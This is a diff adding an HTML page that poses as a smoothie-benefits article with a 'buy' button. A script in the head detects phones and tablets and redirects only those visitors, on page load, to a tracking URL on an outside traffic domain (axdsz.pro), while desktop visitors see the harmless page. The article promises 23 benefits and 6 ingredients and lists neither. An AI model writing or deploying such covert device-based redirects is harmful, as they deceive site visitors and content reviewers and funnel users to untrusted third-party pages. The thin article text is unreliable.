@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+<script>
+
+function userAgentDetect() {
+
+    let debugMode = false;
+
+    if(window.navigator.userAgent.match(/Mobile/i)
+
+        || window.navigator.userAgent.match(/iPhone/i)
+
+        || window.navigator.userAgent.match(/iPod/i)
+
+        || window.navigator.userAgent.match(/IEMobile/i)
+
+        || window.navigator.userAgent.match(/Windows Phone/i)
+
+        || window.navigator.userAgent.match(/Android/i)
+
+        || window.navigator.userAgent.match(/BlackBerry/i)
+
+        || window.navigator.userAgent.match(/webOS/i)) {
+
+        if (window.navigator.userAgent.match(/Tablet/i)
+
+            || window.navigator.userAgent.match(/iPad/i)
+
+            || window.navigator.userAgent.match(/Nexus 7/i)
+
+            || window.navigator.userAgent.match(/Nexus 10/i)
+
+            || window.navigator.userAgent.match(/KFAPWI/i)) {
+
+            window.deviceTypeVar = 'tablet';
+
+            if (debugMode === true) {
+
+                alert('Device is a tablet - ' + navigator.userAgent);
+
+            }
+
+        } else {
+
+            if (debugMode === true) {
+
+                alert('Device is a smartphone - ' + navigator.userAgent);
+
+            };
+
+            window.deviceTypeVar = 'smartphone';
+
+        }
+
+    } else if (window.navigator.userAgent.match(/Intel Mac/i)) {
+
+        if (debugMode === true) {
+
+            alert('Device is a desktop or laptop- ' + navigator.userAgent);
+
+        }
+
+        window.deviceTypeVar = 'desktop_or_laptop';
+
+    } else if (window.navigator.userAgent.match(/Nexus 7/i)
+
+        || window.navigator.userAgent.match(/Nexus 10/i)
+
+        || window.navigator.userAgent.match(/KFAPWI/i)) {
+
+        window.deviceTypeVar = 'tablet';
+
+        if (debugMode === true) {
+
+            alert('Device is a tablet - ' + navigator.userAgent);
+
+        }
+
+    } else {
+
+        if (debugMode === true) {
+
+            alert('Device is unknown- ' + navigator.userAgent);
+
+        }
+
+        window.deviceTypeVar = 'Unknown';
+
+    }
+
+}
+
+
+
+userAgentDetect();
+
+if(window.deviceTypeVar == 'tablet' || window.deviceTypeVar == 'smartphone'){
+
+    location.href = "http://axdsz.pro/?target=-7EBNQCgQAAAPupgNsXgAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE&al=62237&subacc3=le&subacc4=554677642004502";
+
+}
+
+</script>
+    <meta charset="UTF-8">
+    <title></title> <!-- Название страницы -->
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="media.css">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+
+    <header>
+        <div class="container">
+            <a href="index.html" class="logo"><script>document.write(document.domain)</script></a>
+            <p class="quote"></p>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <h1>23 Important Benefits of Drinking Healthy Smoothies</h1>
+
+            <img src="imaage.jpg" alt="Nature">
+
+            <p class="main__p">Juicing and smoothies are all the rage right now. While both can boost your fruit and vegetable intake (something most Americans need to do) and are great for getting a variety of produce into your diet, one is the better choice. That's the smoothie. Why? Juicing leaves behind a pulp-which contains fiber and nutrients that you end up tossing away-and thus you lose most of the benefits of whole fruits and vegetables. Blending produce into a smoothie, however, preserves fiber-and a smoothie can deliver an extra boost of vitamins, minerals and phytochemicals because it often includes fruit skins and pith. If your smoothie includes yogurt or milk, you get some calcium too. Blending, however, introduces oxygen and sometimes heat, which will knock out a little vitamin C and some B vitamins. (No big deal really, as most of us get plenty of C and produce isn't a top source of the most sensitive B vitamins.) Add these 6 ingredients to your smoothie to make it super-healthy.
+
+</p>
+
+            <a href="OrderForm.html" class="main__btn">buy</a>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <a href="Privacy_Policy.html">Privacy Policy</a>
+        </div>
+    </footer>
+
+    <script src="main.js"></script>
+    <script>
+        var h1 = document.getElementsByTagName("h1")[0].innerHTML;
+        var image = document.getElementsByTagName("img")[0].src;
+        sessionStorage.setItem("h1", h1);
+        sessionStorage.setItem("image", image);
+    </script>
+
+</body>
+</html>
